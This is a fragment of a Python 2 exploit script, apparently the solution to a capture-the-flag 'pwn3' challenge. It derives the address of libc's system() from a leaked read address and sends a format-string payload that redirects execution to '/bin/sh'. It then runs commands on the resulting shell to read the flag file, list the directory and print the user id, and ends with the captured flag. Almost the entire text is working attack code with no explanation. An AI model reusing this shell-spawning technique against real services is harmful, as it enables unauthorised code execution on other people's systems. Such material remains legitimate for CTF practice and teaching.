...
system_address = 0xf758cf10 - 0xf754d000 + libc_read_address
print hex(system_address)
#dump_mem(system_address)
# 5383ec088b442410e87e460e00000000
# 5383ec088b442410e87e460e00000000
system_address_string = struct.pack("<I",system_address)
command = '/bin/sh\x00'
format_string_1 = command+'\x00'*(16-len(command))+system_address_string+system_address_string
print len(format_string_1)
s.send(format_string_1)
time.sleep(1)

s.send('cat /home/pwn3/flag\n')
print s.recv(10240)
s.send('ls -l /home/pwn3\n')
print s.recv(10240)
s.send('id\n')
print s.recv(10240)

"""
0x3004{***Song_co_the_can_nui_co_the_mon***}
"""
